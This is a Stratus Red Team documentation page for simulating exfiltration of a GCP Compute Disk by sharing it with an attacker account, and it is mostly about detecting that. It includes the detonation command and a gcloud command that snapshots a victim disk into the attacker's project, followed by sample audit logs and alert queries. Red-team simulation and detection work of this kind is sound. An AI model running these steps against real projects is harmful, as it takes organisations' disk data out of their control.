---
title: Exfiltrate Compute Disk by sharing it
---

# Exfiltrate Compute Disk by sharing it


 <span class="smallcaps w3-badge w3-blue w3-round w3-text-white" title="This attack technique can be detonated multiple times">idempotent</span> 

Platform: GCP

## Mappings

- MITRE ATT&CK
    - Exfiltration



## Description


Exfiltrates a Compute Disk by sharing with a fictitious attacker account. The attacker could then create a snapshot of the disk in their GCP project.

<span style="font-variant: small-caps;">Warm-up</span>:

- Create a Compute Disk

<span style="font-variant: small-caps;">Detonation</span>:

- Set the IAM policy of the disk so that the attacker account has permissions to read the disk in their own project

!!! note

	Since the target e-mail must exist for this attack simulation to work, Stratus Red Team grants the role to stratusredteam@gmail.com by default.
	This is a real Google account, owned by Stratus Red Team maintainers and that is not used for any other purpose than this attack simulation. However, you can override
	this behavior by setting the environment variable <code>STRATUS_RED_TEAM_ATTACKER_EMAIL</code>, for instance:

	```bash
	export STRATUS_RED_TEAM_ATTACKER_EMAIL="your-own-gmail-account@gmail.com"
	stratus detonate gcp.exfiltration.share-compute-disk
	```


## Instructions

```bash title="Detonate with Stratus Red Team"
stratus detonate gcp.exfiltration.share-compute-disk
```
## Detection


You can detect when someone changes the IAM policy of a Compute Disk, using the GCP Admin Activity audit logs event <code>v1.compute.disks.setIamPolicy</code>. Here's a sample event, shortened for clarity:

```json hl_lines="18 20 25""
{
  "protoPayload": {
    "@type": "type.googleapis.com/google.cloud.audit.AuditLog",
    "authenticationInfo": {
      "principalEmail": "user-sharing-the-disk@domain.tld",
      "principalSubject": "user:user-sharing-the-disk@domain.tld"
    },
    "requestMetadata": {
      "callerIp": "34.33.32.31",
      "callerSuppliedUserAgent": "google-cloud-sdk gcloud/..."
    },
    "resourceName": "projects/victim-project/zones/us-central1-a/disks/stratus-red-team-victim-disk",
    "request": {
      "policy": {
        "version": "3",
        "bindings": [
          {
            "role": "roles/owner",
            "members": [
              "user:attacker@gmail.com"
            ]
          }
        ]
      },
      "@type": "type.googleapis.com/compute.disks.setIamPolicy"
    }
  }
}
```

After the attacker has permissions on the Compute Disk, they can create a snapshot of it in their own GCP project using:

```bash
gcloud compute snapshots create stolen-snapshot \
	--source-disk https://www.googleapis.com/compute/v1/projects/victim-project/zones/us-central1-a/disks/stratus-red-team-victim-disk
```

When they do so, a GCP Admin Activity event <code>v1.compute.snapshots.insert</code> is generated in the victim project, 
indicating that the attacker has not only shared but also actively stolen data from the disk (sample event shortened below):

```json hl_lines="5 6 14 16"
{
  "protoPayload": {
    "@type": "type.googleapis.com/google.cloud.audit.AuditLog",
    "authenticationInfo": {
      "principalEmail": "attacker@gmail.com",
      "principalSubject": "user:attacker@gmail.com"
    },
    "requestMetadata": {
      "callerSuppliedUserAgent": "google-cloud-sdk gcloud/...",
      // Note: the IP of the attacker is not logged in this event
    },
    "serviceName": "compute.googleapis.com",
    "methodName": "v1.compute.snapshots.insert",
    "resourceName": "projects/victim-project/zones/us-central1-a/disks/stratus-red-team-victim-disk",
    "request": {
      "@type": "type.googleapis.com/compute.snapshots.insert"
    },
    "metadata": {
      "@type": "type.googleapis.com/google.cloud.audit.CrossEntityControlAuditMetadata"
    }
  }
}
```

Based on these events, detection strategies may include:

- Alerting when the IAM policy of a Compute Disk is changed, especially if such a sharing mechanism is not part of your normal operations. Sample GCP Logs Explorer query:

```sql
protoPayload.methodName="v1.compute.disks.setIamPolicy"
```

- Alerting when someone with an unexpected e-mail domain creates a snapshot of a Compute Disk. Sample GCP Logs Explorer query:

```sql
protoPayload.methodName="v1.compute.snapshots.insert"
NOT protoPayload.authenticationInfo.principalEmail=~".+@your-domain.tld$"
```


